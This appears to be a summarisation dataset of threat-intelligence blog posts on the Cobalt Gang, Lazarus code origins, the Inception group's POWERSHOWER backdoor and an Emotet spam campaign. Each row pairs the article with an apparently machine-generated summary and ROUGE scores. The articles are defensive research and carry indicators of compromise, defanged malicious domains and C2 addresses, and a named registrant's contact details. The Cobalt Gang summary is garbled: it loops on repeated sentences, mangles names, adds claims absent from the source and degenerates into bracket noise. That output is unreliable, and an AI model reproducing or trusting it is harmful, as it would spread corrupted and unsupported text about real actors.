entities. All of the PDF files embed a link based on a Google redirect, leading to the download of a Microsoft Office document file. The Microsoft Office document files contain macros for code execution. Those macros match the characteristics of the builder that we have characterized.Discovering the Attacker's InfrastructureWith these results obtained, we can start to move towards finding attacker infrastructure pieces based on multiple aspects, such as the hunting rules defined in previous sections, session data obtained by our telemetry, or public WHOIS registrar data.Using our ""hunting rules""Based on the metadata and builder characteristics, we have tracked a set of malicious PDF and Office files (see Appendix) that provide us with domains and Office files in use by the attacker.Some examples of the PDF and embedded C2 links and document names are below in Table 1:SHA256 Embedded Link 1fd9ba8eb97bf03cd4d3cbaac867595c920f1f36ebfbe9c1fc76558ea5e0ece5 hxxp://www[.]pedidoslalacteo[.]com[.]ar/Proof-of-payment-19.09.2018.doc 5ac1612535b6981259cfac95efe84c5608cf51e3a49b9c1e00c5d374f90d10b2 hxxps://s3[.]sovereigncars[.]org[.]uk/inv005189.pdf 07f60611836c0a679c0fb2e25f5caeb4d29cd970919d47f715666b80be46f45c hxxps://alotile[.]biz/Document092018.doc 9d6fd7239e1baac696c001cabedfeb72cf0c26991831819c3124a0a726e8fe23 hxxps://goo[.]gl/mn7iGj Which redirects to: hxxps://document[.]cdn-one[.]biz/doc000512.pdf 444c63bb794abe3d2b524e0cb2c8dcc174279b23b1bce949a7125df9fab25c1c hxxps://safesecurefiles[.]com/doc041791.pdf a5f2ad08b5afdbd5317b51d0d2dd8f781903522844c786a11a0957a81abfd29e hxxp://www[.]mky[.]com/Proof-of-payment-19.09.2018.doc df18e997a2f755159f0753c4e69a45764f746657b782f6d3c878afb8befe2b69 hxxps://mail[.]halcyonih[.]com/uploads/doc004718538.pdfTable 1. Example PDF and embedded linksThe PDF documents and URLs allowed us to discover multiple overlaps between this new infrastructure and the existing knowledge about Cobalt Gang attributed activity in previous research, corroborating new infrastructure belonging to the same attacker.Let's see a couple of examples of PDF documents from the list which belong to the same Document ID.Observed File Name SHA256 inv005189.pdf 5ac1612535b6981259cfac95efe84c5608cf51e3a49b9c1e00c5d374f90d10b2This sample has been already documented in previous campaigns, being related to s3[.]sovereigncars[.]org[.]uk domain. See the Talos blog.Observed File Name SHA256 doc000512.pdf 9d6fd7239e1baac696c001cabedfeb72cf0c26991831819c3124a0a726e8fe23The sample embeds the URL hxxps://goo[.]gl/mn7iGj which is actually a shortened URL resolving to hxxps://document[.]cdn-one[.]biz/doc000512.pdf.Domain cdn-one[.]biz is a well-known Cobalt Gang attributed domain in previous analysis.The complete list of domains used by the PDF identified can be found in the Appendix section.Pivoting on Email Sender TelemetryBased on email delivery data, our telemetry helps us collecting samples related and indicators related to the campaign.Let's put a simple example of how tracking session data lead us to new infrastructure, by using some of the email sender data that is identified in malicious email sessions sending the PDF documents.For example, the following senders belong to the recent campaign and are spoofing both legitimate email domains and senders:Some of the samples delivered by these senders and their embedded links are shown below in Table 2:SHA256 Embedded link 1c1a6bb0937c454eb397495eea034e00d1f7cf4e77481a04439afbc5b3503396 hxxps://alotile.biz/Document092018.doc 187e0d911cd0393caad1364ded1c394257cd149898b31f9718c7c6319af79818 hxxps://alotile.biz/Document042018.doc 988d430ce0e9f19634cf7955eac6eb03e3b7774b788010c2a9742b38016d1ebf hxxps://fundsxe.com/Document09202018.doc 852f11e5131d3dab9812fd8ce3cd94c1333904f38713ff959f980a168ef0d4ce hxxps://fundsxe.com/Document09222018.docTable 2. Email sender associated PDFs and embedded linksThese sample are delivered under the following file names:REMITTER REFERENCE PMT.pdf Aml_S0680260A79301.pdf CIT180126-000768.pdf AMENDMENT.pdf Citi720TEME171440008_Query.pdf Query _S-170526-005399.pdfBoth the domains and file names correlate with the results of the domains obtained based on hunting for PDFs metadata and macro builder structure, allowing us to keep tracking new activity over time.WHOIS Registrar OverlapsTwo of the newly discovered domains used by the collected PDF documents have very interesting registrant information, pointing to a public registrant name, ""grigoredanbadescu"".Figure 16. Historical DNS data on safesecurefiles[.]comDomains:safesecurefiles[.]comdocument[.]cdn-one[.]bizWHOIS registrar information:grigoredan@centrum.cz Grigoredanbadescu +4001289858474 (Romania) Brasov RomaniaBy pivoting on infrastructure related to the same registrant data we can obtain a very interesting set of domains:arubrabank[.]comoutlook-368[.]comusasecurefiles[.]comsafesecurefiles[.]comms-server838[.]commsoffice-365[.]comtotal-share[.]bizbank-net[.]bizcdn-one[.]biztotal-cloud[.]bizweb-share[.]bizcloud-direct[.]bizn-document[.]bizmy-documents[.]bizfirstcloud[.]bizyourdocument[.]bizxstorage[.]bizsafe-cloud[.]bizvia24[.]bizzstorage[.]bizwebclient1[.]bizbnet1[.]bizfirstcloud[.]bizmycontent[.]biztotal7[.]bizfreecloud[.]bizcontents[.]bzjudgebin[.]bzMany of the domains listed are already known as malicious domains attributed to other Cobalt Gang campaigns.As an important note ""arubrabank[.]com"" is a new domain registered on 2019-09-18 and still not observed in an active campaign.The domain seems to be intended to mimic the legitimate Arubabank website for further activity:Figure 17. Arubabank legitimate siteInfrastructure RelationshipsLet's summarize all the pieces of our puzzle, now that we can put together all the relationships we observed.Figure 18. Maltego graph. Summary of relations and overlaps.As it can be observed in the different clusters of activity:The initial cluster of PDF documents, on the left, links to specific domains for the download of Microsoft Office files using the macro builder structure. Some of the domains in use are publicly registered with the name of ""grigoredanbanescu"" and allow us to find other related domains, which are already linked to previous Cobalt Gang activity. Some of the initial PDFs have relations with Microsoft Office files linked to ""grigoredanbanescu"" activity, confirming again the relationships.ConclusionCommodity attacks are widely used for both criminal and more targeted attacks, making identification difficult for networks defenders and threat hunters. One actor that makes extensive use of this approach to compromise victims is the Cobalt Gang.By focusing on specific aspects of the macro builders and metadata the actors left behind we were able to develop new mechanisms to track and hunt Cobalt Gang activity and infrastructure.Palo Alto Networks customers are protected in the following ways:WildFire detects malware samples used by this campaign.Traps prevents these attacks at the endpoint.All involved malicious domains have been covered by PAN-DB URL Filtering.An Autofocus tag has been created for tracking CobaltGang actor group.Appendix - Indicators of CompromiseInitial exampleType SHA256 Email 2f74c8b55292d59ab66960f21a4413d4d54f8b7500bb385954e7ffe68d775443 PDF 57f65ecb239833e5a4b2441e3a2daf3513356d45e1d5c311baeb31f4d503703e Microsoft Office Document 07a3355f81ff69a197c792847d0783bfc336181d66d3a36e6b548d0dbd9f5a9a Domain transef[.]bizOutlook messages477c432382c97648767ee45c264f0f2aaf8d3d9f9ed547d8418db12b7c140760e0f1dbc10088b68f772ee73b0785c3d67b8e5f147b687911613d163ad5ebda6de6a17617eaa98c49bfb2c9d3d090ffea69bb0c1864c43861bdf8d027339ea847Microsoft Office Document (Macro builder)020ba5a273c0992d62faa05144aed7f174af64c836bf82009ada46f1ce3b6eee8004601c08983420408d2784e2a4aa79de426d41a09726a884edcb21f83ee7f8d8a2384a51cd59f6390e6a4fcb04b51358cdbd5e04cae5be23daae548c306a73161ba501b4ea6f7c2c8d224e55e566fef95064e1ed059d8287bc07e790f740e862a278119d732e4c839ee074553f087588a9040be027bdf9e617413c6fd2e9af641d692386dab5ca60f4c6b1da0edecc5c3473c9a7d187dad6098786404780a307a3355f81ff69a197c792847d0783bfc336181d66d3a36e6b548d0dbd9f5a9a161ba501b4ea6f7c2c8d224e55e566fef95064e1ed059d8287bc07e790f740e812ecb6b3780cd19ea84f6e84e816a701e8231441bf90145481baa0648139e001a6f941fcec01fb006fc51df96396aeeb826cdf3864756669e19cb145fe41692f19dc9b93870ddc3beb7fdeea2980c95edc489040e39381d89d0dfe0a825a1570cb5644bd670dcd9caf5185ebe396996e514ed1d93982157186611135aea79bd3a0111977c79f4eb30511f22055b54e4e973c0501240f3ba462691b1b4999d561PDF Documents3a7525ffa571775aca45551ebd2c192d9b8ed45db1a61bdd8398d91db885d7a21d0aae6cff1f7a772fac67b74a39904b8b9da46484b4ae8b621a6566f7761d161c1a6bb0937c454eb397495eea034e00d1f7cf4e77481a04439afbc5b3503396187e0d911cd0393caad1364ded1c394257cd149898b31f9718c7c6319af79818988d430ce0e9f19634cf7955eac6eb03e3b7774b788010c2a9742b38016d1ebf852f11e5131d3dab9812fd8ce3cd94c1333904f38713ff959f980a168ef0d4ce9d6fd7239e1baac696c001cabedfeb72cf0c26991831819c3124a0a726e8fe235ac1612535b6981259cfac95efe84c5608cf51e3a49b9c1e00c5d374f90d10b2df18e997a2f755159f0753c4e69a45764f746657b782f6d3c878afb8befe2b69a5f2ad08b5afdbd5317b51d0d2dd8f781903522844c786a11a0957a81abfd29e66bd5e492531adf675897de5de8aee427b896c9b2c406daff006ce6a4e8aa8101fd9ba8eb97bf03cd4d3cbaac867595c920f1f36ebfbe9c1fc76558ea5e0ece5d5328e519daadaf1520619da1f24f6d81d23c84222640058bbb366752be9353794c9fa812cebb733eda3a4eed33a0a49b60c207bb0f9153c0d08724c8b30f57807f60611836c0a679c0fb2e25f5caeb4d29cd970919d47f715666b80be46f45c7b9c183dc40c8d765e98024f8fb6565c69dee2bb97957c5ba754a23d2698bf7a195580b78e144f66ac1f9be2b927d7828ed1dc3974dc1897e0ed59a96ac8f4e1444c63bb794abe3d2b524e0cb2c8dcc174279b23b1bce949a7125df9fab25c1c07f60611836c0a679c0fb2e25f5caeb4d29cd970919d47f715666b80be46f45c7629dfcc9345578626a250afb67027955c6f78dd80b771c2968c5be0d4b11c59195580b78e144f66ac1f9be2b927d7828ed1dc3974dc1897e0ed59a96ac8f4e1b92707ebfaa15225064ff3a1a7d279b3dde1e70200e37d0074e9acc160cb16a7ebf309ecd6c7a0911e1252d9e90fd302bfbd3e1d2679772025bdb9cc38bca14157f65ecb239833e5a4b2441e3a2daf3513356d45e1d5c311baeb31f4d503703eDomainsalotile[.]bizfundsxe[.]coms3[.]sovereigncars[.]org[.]uksafesecurefiles[.]comdocument[.]cdn-one[.]bizmail[.]halcyonih[.]comtransef[.]bizDomains registered by ""grigoredanbanescu""arubrabank[.]comoutlook-368[.]comusasecurefiles[.]comsafesecurefiles[.]comms-server838[.]commsoffice-365[.]comtotal-share[.]bizbank-net[.]bizcdn-one[.]biztotal-cloud[.]bizweb-share[.]bizcloud-direct[.]bizn-document[.]bizmy-documents[.]bizfirstcloud[.]bizyourdocument[.]bizxstorage[.]bizsafe-cloud[.]bizvia24[.]bizzstorage[.]bizwebclient1[.]bizbnet1[.]bizfirstcloud[.]bizmycontent[.]biztotal7[.]bizfreecloud[.]bizcontents[.]bzjudgebin[.]bzURLshxxp://www[.]pedidoslalacteo[.]com[.]ar/Proof-of-payment-19.09.2018.dochxxps://s3[.]sovereigncars[.]org[.]uk/inv005189.pdfhxxps://alotile[.]biz/Document092018.dochxxps://goo[.]gl/mn7iGjhxxps://document[.]cdn-one[.]biz/doc000512.pdfhxxps://safesecurefiles[.]com/doc041791.pdfhxxp://www[.]mky[.]com/Proof-of-payment-19.09.2018.dochxxps://mail[.]halcyonih[.]com/uploads/doc004718538.pdfhxxps://e-dropbox[.]biz/doc058915654e.pdfhxxp://www[.]bit[.]do/etaYkhxxps://cloud-direct[.]biz/doc0047581678.pdfhxxps://transef[.]biz/Doc102018.docObserved File NamesDocument082018.docREMITTER REFERENCE PMT.pdfAml_S0680260A79301.pdfCIT180126-000768.pdfAMENDMENT.pdfCiti720TEME171440008_Query.pdfQuery _S-170526-005399.pdfDocument092018.docProof of payment 19.09.2018.docDocument092018.docdoc005681.doc";"The ITSecurity report discusses the use of commodity tools and malware along with very simple initial delivery methods to keep a low profile and stay away from possible attribution. One of the most common approaches is the use of spear phishing emails employing social engineering or commonly used exploits (such as CVE20170199 or the ThreadKit builder) to trick the employees of organizations of interest. Once the initial infection has occurred is when the attacker becomes more sophisticated, deploying advanced custom pieces of malware, more advanced tools, and/or using livingoffthe land tools (such as the use of PowerShell, or tools like CMSTP or Regsvr32). This approach makes it more difficult for threat hunters and defenders to find those needles in the haystack necessary to identify a campaign and its objectives. However even if an attacker uses commodity builders and tools, there is always a chance to find specific signals or characteristics that help to identify and track an actor's infrastructure. One of the groups well known for following these TTPs is the Cobalt Gang, which is still active even after the arrest of their alleged leader in Spain this year.During October 2018, Unit 42 has been investigating ongoing Cobalt Gang campaigns, as well as leveraging the latest information publicly reported in research reports, such as the ones described by Talos or Morphisec, to help discover and tie new infrastructure to this attack group.As a result, we have been able to identify both the use of a common macro builder as well as specific document metadata which have allowed us to track and cluster new activity and infrastructure associated with the Cobalt Gang.A Recent Effective Example of DeliveryOne of the latest examples related to the campaign under analysis was used in attacks just The ITSecurity report provides an overview of the Cobalt Gang's malicious activities, including the use of malicious macros in MS Word documents to bypass AppLocker, the use of PDF documents to transport malicious macros via email, and the use of CMSTP.EXE to run a ""scriptlet"", a technique well known to bypass AppLocker. ? yara cmstp_macro_builder.yar 1 2 3 4 5 6 7 The attacker's infrastructure is composed of multiple domains, such as pedidoslalacteo[.]com[. ]ar, sovereigncars[.]org[. ]uk, alotile[. ]biz, and document[.]cdnone[. ]biz. Additionally, the attacker's infrastructure is composed of multiple Office files, such as Proofofpayment19.09.2018.doc, inv005189.doc, doc000512.pdf, and doc000512.pdf. Additionally, the attacker's infrastructure is composed of multiple domains, such as pedidoslalacteo[.]com[. ]ar, sovereigncars[.]org[. ]uk, alotile[. ]biz, and document[.]cdnone[. ]biz. Additionally, the attacker's infrastructure is composed of multiple Office files, such as Proofofpayment19.09.2018.doc, inv005189.doc, doc000512.pdf, and doc000512.pdf. Additionally, the attacker's infrastructure is composed of multiple domains, such as pedidoslalacteo[.]com[. ]ar, sovereigncars[.]org[. ]uk, alotile[. ]biz, and document[.]cdnone[. ]biz. Additionally, the attacker's infrastructure is composed of multiple Office files, such as Proofofpayment19.09.2018.doc, inv005189.doc, doc000512.pdf, and doc000512 The Cobalt Gang is a group of cybercriminals that have been active since at least 2013. They are known for their use of malicious PDF documents to distribute malware, as well as their use of phishing emails to lure victims into clicking on malicious links. The Cobalt Gang is believed to be based in Eastern Europe, but their exact location is unknown. of..... [ of the [.... with [222 in in in [2 [2 in [2 [2 [ [ [. [ [. [. [. [ of [ of [ of [ of [. [.. of with of with.... [. [. [. [. [. [......... [. [. [. [. [. [. [ [ [ of [ of [ of [ of the [ [ [ [ [ [ [ [2 [2 [2 [. [. [ [. [. [. [. [. [. [. [. [. [. [. [....... [ [ [ [ [ [ [ [ [ [ [ [. [ [ [ [ [ [ [ [ of [ of [ of [ of [. [. [. [. [. [. [. [. [... [ [. [. [.. [ [ [ [. [ [ [ [ [ [ [ [ [ [ [ [ [ [. [........................................... [. [. [........................................................................................ [[ [[ [[ [[. [[. [. [. . . . . . . (.";en;{'r': 0.22364532019704433, 'p': 0.8345588235294118, 'f': 0.3527583494247961};{'r': 0.13458029197080293, 'p': 0.6828703703703703, 'f': 0.2248475582250149};{'r': 0.22167487684729065, 'p': 0.8272058823529411, 'f': 0.349650346316793}
https://intezer.com/blog/research/paleontology-the-unknown-origins-of-lazarus-malware/;Paleontology: The Unknown Origins of Lazarus Malware;"INTRODUCTIONAs seen by security researchers across the world and proven in a joint research by McAfee and Intezer, Lazarus, one of the groups operating from North Korea, has consistently reused code in their malware toolset. There is a common pattern among the code of the malware that researchers and reverse engineers alike find during their analysis. It has already been known that they have used open source projects, like one from CodeProject we documented in another blog post, or open source RATs like Gh0st RAT.This code, as described, has always been thought to be created originally by the DPRK since the time they are thought to have started being active in 2007 until the present. We recently found some samples via our Vaccine feature (Yara signatures) on VirusTotal with very low detections dating back to 2016 which led us to find the origins of their toolset - an open source RAT called CasperPhpTrojan, available on a Chinese website for open source projects.CASPERTROYOriginally, the sample that we found in the wild, hit a Lazarus signature and only had 3/65 detections. After checking it in Intezer Analyze(tm), we saw code reuse with Red Gambler, as originally reported by AhnLab.https://analyze.intezer.com//analyses/47eff0cd-fc54-44c4-ba33-18e0ae21f3caWe can also see on the trojan that the internal name for this module is called ""DllTroy.dll"" which is known to be associated with Lazarus.The string reuse is where the interesting finding comes from and will soon reveal where we got the name CasperTroy from. The reused strings are in general Lazarus samples used throughout different cyber campaigns, Operation Troy, a Lazarus cyber campaign beginning in 2011, and Prioxer, another tool in their arsenal.We see the same overlap of strings and decided to search ""7d414e351603fa"" on Google, resulting in only 7 results, which will bring us to the next topic of this research - where did DPRK's malware toolset originate?THE ORIGINS: CASPERPHPTROJANThe source code to this open source trojan, CasperPhpTrojan, was originally posted on a Chinese open source project website pudn[.]com. We downloaded the source code, read through it, compiled it, and recognized similar occurrences in Lazarus malware. We would like to show you some of the evidence we have gathered by comparing the original code to the disassembly of different Lazarus binaries. Also, much of this evidence has been documented in a previous blog post (https://intezer.com//blockbusted-lazarus-blockbuster-north-korea/) where we spoke about strange occurrences in the code and the same code being reused again and again -- even when the code was believed to be a mistake, like the third example below.HTTP Header (various campaigns & malware)(CASPER.CPP)(Disassembly of multiple different Lazarus samples)TrojUploader Function(casper_trojan.cpp)(TDrop Sample)GetProcAddress(LoadLibrary(""Kernel32.dll""), ""GetProcAddress""),(CASPER.CPP)(Lazarus samples from 2014 and 2017)API Resolution(casper_inject.cpp)(Various Lazarus samples)ConclusionAlthough there are many modifications Lazarus made to CasperPhpTrojan, the base is primarily the same and we believe that when the source code is compiled under the correct environment with the correct flags, we can find even more correlations between the compiled code and Lazarus binaries. It looks like it is the base of their toolset and may strengthen the reason why we found so many code connections between Lazarus malware in our comprehensive research with McAfee about the DPRK. You might want to look at our timeline of attacks and the related files with code reuse on our DPRK timeline.IOCsCasperTroy (2016) Droppers:458ffcc41959599f8dab1fd4366c9a50efefa376e42971c4a436aa7fd697a396d1cf03fbcb6471d44b914c2720821582fb3dd81cb543f325b2780a5e95046395CasperTroy (2016) RATs:ec73fe2ecc2e0425e4aeb1f01581b50c5b1f8e85475c20ea409de798e6469608c62ec66e45098d2c41bfd7a674a5f76248cf4954225c2d3a2cfcd023daa93522926a2e8c2baa90d504d48c0d50ca73e0f400d565ee6e07ad6dafdd0d7b948b0eCasperTroy C&Cs:http://ready-jetkorea[.]com/data/file/pop/write_ok.phphttp://plsong[.]com/xe/addons/counter/conf/write_ok.phpShared Code Examples:TDrop f4b7b36e9c940937748d5bba3beb82b7c3636f084e5e913c7a5ad3ad623ffbc5MYDOOM 1b6a1320fba00dd2e56e35cf6f11f941deabcb6e4dba7ea773ded7e3d648ec54KoreDos 068b89e2ec5655d006f2788ea328e5f12bd57ba761ee03c4de2fb0aa01c92c7fDarkSeoul 4915f53221dc7786710a7a82a9cb00cf8468e0d1155a1355c9eb17e8cddfd265Blockbuster 6724c041fe0df61a619006bf1df4a759f4f22a65e2afda32501760ebc9ebe25d";CasperTroy C&Cs:http://readyjetkorea[.]com/data/file/pop/write_ok.phphttp://plsong[.]com/xe/addons/counter/conf/write_ok.phpShared Code Examples:TDrop f4b7b36e9c940937748d5bba3beb82b7c3636f084e5e913c7a5ad3ad623ffbc5MYDOOM 1b6a1320fba00dd2e56e35cf6f11f941deabcb6e4dba7ea773ded7e3d648ec54KoreDos 068b89e2ec5655d006f2788ea328e5f12bd57ba761ee03c4de2fb0aa01c92c7fDarkSeoul 4915f53221dc7786710a7a82a9cb00cf8468e0d1155a1355c9eb17e8cddfd265Blockbuster 6724c041fe0df61a619006bf1df4a759f4f22a65e2afda32501760ebc9ebe25d;en;{'r': 0.03986710963455149, 'p': 0.9230769230769231, 'f': 0.07643312022536411};{'r': 0.018975332068311195, 'p': 0.8333333333333334, 'f': 0.037105750956109886};{'r': 0.03986710963455149, 'p': 0.9230769230769231, 'f': 0.07643312022536411}
https://unit42.paloaltonetworks.com/unit42-inception-attackers-target-europe-year-old-office-vulnerability/;Inception Attackers Target Europe with Year-old Office Vulnerability;"This post is also available in: ??? (Japanese)The Inception attackers have been active since at least 2014 and have been documented previously by both Blue Coat and Symantec , historical attacks used custom malware for a variety of platforms, and targeting a range of industries, primarily in Russia, but also around the world. This blog describes attacks against European targets observed in October 2018, using CVE-2017-11882 and a new PowerShell backdoor we're calling POWERSHOWER due to the attention to detail in terms of cleaning up after itself, along with the malware being written in PowerShell.Unit 42 has previously observed attacks from the group in 2017 against government targets in Europe, Russia, and Central Asia and expects these to remain the primary regions this threat is seen.In the last writeup by Symantec they describe a two-stage spear phishing process used by the Inception attackers, whereby the attackers first send a reconnaissance spear phish, and follow this up with a second spear phish containing a remote template, which if loaded delivers a first stage payload.In their most recent attacks it appears that only one document is used, but in a way that allows them to not reveal their final payload immediately, however, the use of templates remains the same.Remote Templates are GreatRemote templates are a feature of Microsoft Word which allow a document to load a template to be used in a document - this template can be externally hosted, either on a file share, or on the internet. The template is then loaded when the document is opened. The Inception attackers use this feature in a malicious context as shown in Figure 1 below:Figure 1. Overview of how the attack takes place.Using a remote template in this way has been a consistent feature of the Inception attackers' attacks for the past 4 years and has three main benefits to the attacker:The initial document does not contain any explicitly malicious object, it simply references an external object, meaning it should bypass static analysis techniques, an example of how this appears in the document is shown in Figure 2. The attacker has the option to deploy malicious content to the victim based upon initial data received from the target, such as Microsoft Word version (sent in the User-Agent) and the IP address of the target, see: Figure 1. Once the attack is over, and the server hosting the remote template is down, it is difficult for researchers to analyze the attack as the remote content is unlikely to be available to them.Figure 2. Example of how remote templates are referenced in Inception documents.When opened, the documents display decoy content and attempts to fetch a malicious remote payload via HTTP. The decoy content is usually copied from media reports, often with political themes in the target regions, some examples of decoys observed are shown in Figure 3, including invites to international conferences and news articles on the current situation in Crimea.Figure 3. Examples of decoys shown in Inception attacks in 2018. The first is taken from a VGOPAD invitation sent on Facebook in 2017, the second is from a European Policy center summary .On most occasions the remote server did not return a malicious template, however we recently observed two cases where a malicious template containing two exploits was served. In both cases the template contained exploits for both CVE-2012-1856 and CVE-2017-11882 , which target vulnerabilities in Word disclosed and patched in 2012 and 2017 respectively.The payload for the exploits was VBScript in an OLE package object, which in turn decodes and executes POWERSHOWER, a simple PowerShell backdoor.POWERSHOWER - Malware that Cleans up After ItselfEarlier, we mentioned that previous attacks were apparently delivered over two spear phishing emails, with the first only being used for reconnaissance. In the latest cases we only observed a single document being sent to the targets, with reconnaissance, exploitation, and payload delivery happening on the first attempt.The dropped payload, POWERSHOWER, acts as an initial reconnaissance foothold and is almost certainly used to download and execute a secondary payload with a more complete set of features. By only using this simple backdoor to establish a foothold, the attacker can hold back their most sophisticated and complex malware for later stages, making them less likely to be detected.In a nutshell, POWERSHOWER allows the attacker to:Fingerprint the machine, and upload this information to the initial C&C.Clean up a significant amount of forensic evidence from the dropper process, as we detail below.Run a secondary payload, if the attacker decides the target machine is sufficiently interesting (based on analysis of the system data sent from the first beacon)POWERSHOWER AnalysisPOWERSHOWER first checks if Microsoft Word is currently running, if it is, then the malware assumes it is the first run through of the malware and performs the following operations:Writes itself to %AppData%\Microsoft\Word\log.ps1 Sets up persistence for this file, using a run key. Adds a registry key so that future powershell.exe instances are spawned off-screen by default - this trick is explained here . Kills the Microsoft Word process. Removes all files created during the dropper process, including evidence the original document was opened, the initial .VBS file, and all temporary files associated with the retrieval of the remote template in the IE temporary files directory. Removes all registry entries that are left behind during the dropper process. Collects system information on the infected machine and POSTS it to the C2.If Microsoft Word is not running, the malware enters its main communications loop, performing the following actions in sequence, this loop should only be entered after a reboot of the machine:Collects system information and POSTs it to the C2. Performs a GET request Based on the status code of the GET request it will branch operations: If the status code is not 200, the malware sleeps for a random amount of time between approximately 25 minutes and 35 minutes, based on a randomly generated number.If the status code is 200 the malware expects the response to: Begin with an ""P"", in which case the malware writes the response to disk, presumably to be executed or used in a subsequent command. Begin with an ""O"", in which case the malware assumes the response contains VBS code which is saved to disk, then executed. If not beginning with either these characters, it is assumed to be an XML file containing PowerShell expression, which is written to disk, read into memory, deleted, and then executed.The code behind the main C&C loop is shown in Figure 4.Figure 4. The main C&C loop.Although the malware is simple, it's fairly effective, giving the attacker options on how to run their next, more sophisticated, payload.ConclusionThe Inception attacks continue to mostly stay under the radar, which in part is down to the effort put in by the attackers to make their attacks harder to analyze. In the latest wave of attacks, they've done this through:Use of remote templates, hindering analysis of historical attacks.Anti-forensics techniques used during the dropper process to prevent clues as to how the malware was installed - being left on disk or in the registry.Use of the new basic POWERSHOWER backdoor as a first stage, making it harder for researchers to get copies of more sophisticated payloads used by the attackers.Palo Alto Networks customers are protected from this threat in the following ways:Wildfire detects all current Inception remote template documents, and the downloaded CVE-2017-11882 RTFs with malware verdicts.AutoFocus customers can track associated samples with the InceptionRemoteTemplate and PowerShowerand Traps blocks all of the files we are aware of that are associated with this campaign.Indicators of CompromiseRemote Template Documents where we have the matching payload13de9678279b6ce6d81aeb32c0dd9f7458ad1f92aee17f3e052be9f06d473bedd547773733abef19f2720d4def2356d62a532f64bcb002fb2b799e9ae39f805fRemote templates analyzed.687ee860fd5cd9902b441c26d72788d5a52052d03047a9b071808fc4c53a7e8b72eb022f395cc15bbe9582ee02f977ea0692932461a8b0bd608d9f0971125999PowerShower sample8aef4975d9c51821c4fa8ee1cbfe9c1f4a88c8784427d467ea99b2c1dabe15aeOther related templates and exploit documents from 201849dbcf1fc8d3381e495089f396727a959885c1dd2ab6cd202cf3c4dbd1d27c4f8b212ee2d65c4da033c39aebaf59cc51ade45f32f4d91d1daa0bd367889f934dcc64a68ba52283f6cf5521cf75567b3c5b5143f324d37c59906ee63f1bbafcaf2bcb8a4ddc2150b25a44c292db870124c65687444f96e078f575da69bbf018e0InfrastructureFirst Seen IP Context 20th July 2018 51.255.139[.]194 Remote template host 13th August 2018 188.165.62[.]40 Remote template host 10th October 2018 200.122.128[.]208 POWERSHOWER C2 22nd October 2018 108.170.52[.]158 Remote template hostTable 1 - IP Addresses associated with Inception Remote Template documents";"The Inception attackers have been active since at least 2014 and have been documented previously by both Blue Coat and Symantec ; historical attacks used custom malware for a variety of platforms, and targeting a range of industries, primarily in Russia, but also around the world. This blog describes attacks against European targets observed in October 2018, using CVE201711882 and a new PowerShell backdoor we're calling POWERSHOWER due to the attention to detail in terms of cleaning up after itself, along with the malware being written in PowerShell.Unit 42 has previously observed attacks from the group in 2017 against government targets in Europe, Russia, and Central Asia and expects these to remain the primary regions this threat is seen.In the last writeup by Symantec they describe a twostage spear phishing process used by the Inception attackers, whereby the attackers first send a reconnaissance spear phish, and follow this up with a second spear phish containing a remote template, which if loaded delivers a first stage payload.In their most recent attacks it appears that only one document is used, but in a way that allows them to not reveal their final payload immediately; however, the use of templates remains the same.Remote Templates are GreatRemote templates are a feature of Microsoft Word which allow a document to load a template to be used in a document this template can be externally hosted, either on a file share, or on the internet. The Inception attackers use this feature in a malicious context as shown in Figure 1 below:Figure 1. Overview of how the attack takes place.Using a remote template in this way has been a consistent feature of the Inception attackers' attacks for the POWERSHOWER is a malware that";en;{'r': 0.2908777969018933, 'p': 0.976878612716763, 'f': 0.44827585853298774};{'r': 0.22801024765157984, 'p': 0.9501779359430605, 'f': 0.3677685919198465};{'r': 0.2908777969018933, 'p': 0.976878612716763, 'f': 0.44827585853298774}
https://www.welivesecurity.com/2018/11/09/emotet-launches-major-new-spam-campaign/;Emotet launches major new spam campaign;The recent spike in Emotet activity shows that it remains an active threatA week after adding a new email content harvesting module, and following a period of low activity, the malicious actors behind Emotet have launched a new, large-scale spam campaign.What is Emotet?Emotet is a banking Trojan family notorious for its modular architecture, persistence techniques, and worm-like self-propagation. It is distributed through spam campaigns employing a variety of seemingly legitimate guises for their malicious attachments. The Trojan is often used as a downloader or dropper for potentially more-damaging, secondary payloads. Due to its high destructive potential, Emotet was the subject of a US-CERT security notice in July 2018.The new campaignAccording to our telemetry, the latest Emotet activity was launched on November 5, 2018, following a period of low activity. Figure 1 shows a spike in the Emotet detection rate in the beginning of November 2018, as seen in our telemetry data.Breaking those detections down by country, as seen in Figure 2, this latest Emotet campaign appears to be most active the Americas, the UK, Turkey and South Africa.In the November 2018 campaign, Emotet makes use of malicious Word and PDF attachments posing as invoices, payment notifications, bank account alerts, etc., seemingly coming from legitimate organizations. Alternately, the emails contain malicious links instead of attachments. The email subjects used in the campaign suggest a targeting of English and German-speaking users. Figure 3 shows Emotet activity in November 2018 from the perspective of document detections. Figures 4, 5 and 6 are example emails and attachments from this campaign.The compromise scenario in this November 2018 campaign starts with the victim opening a malicious Word or PDF file attached to a spam email seemingly coming from a legitimate and familiar organization.Following the instructions in the document, the victim enables macros in Word or clicks on the link in the PDF. The Emotet payload is subsequently installed and launched, establishes persistence on the computer and reports the successful compromise to its C&C server. In turn, it receives instructions on which attack modules and secondary payloads to download.The modules extend the initial payload's functionality with one or more of credential-stealing, network propagation, sensitive information harvesting, port forwarding, and other capabilities. As for the secondary payloads, this campaign has seen Emotet dropping TrickBot and IcedId on compromised machines.ConclusionThis recent spike in Emotet activity just goes to show that Emotet continues to be an active threat - and an increasingly worrying one due to the recent module updates. ESET systems detect and block all Emotet components under detection names listed in the IoCs section.Indicators of Compromise (IoCs)Example hashesNote that new builds of Emotet binaries are released approximately every two hours, so hashes may not be the latest available.EmotetSHA-1 ESET detection name 51AAA2F3D967E80F4C0D8A86D39BF16FED626AEF Win32/Kryptik.GMLY trojan EA51627AF1F08D231D7939DC4BA0963ED4C6025F Win32/Kryptik.GMLY trojan 3438C75C989E83F23AFE6B19EF7BEF0F46A007CF Win32/Kryptik.GJXG trojan 00D5682C1A67DA31929E80F57CA26660FDEEF0AF Win32/Kryptik.GMLC trojanModulesSHA-1 ESET detection name 0E853B468E6CE173839C76796F140FB42555F46B Win32/Kryptik.GMFS trojan 191DD70BBFF84D600142BA32C511D5B76BF7E351 Win32/Emotet.AW trojan BACF1A0AD9EA9843105052A87BFA03E0548D2CDD Win32/Kryptik.GMFS trojan A560E7FF75DC25C853BB6BB286D8353FE575E8ED Win32/Kryptik.GMFS trojan 12150DEE07E7401E0707ABC13DB0E74914699AB4 Win32/Kryptik.GMFS trojan E711010E087885001B6755FF5E4DF1E4B9B46508 Win32/Agent.TFO trojanSecondary payloadsTrickBotSHA-1 ESET detection name 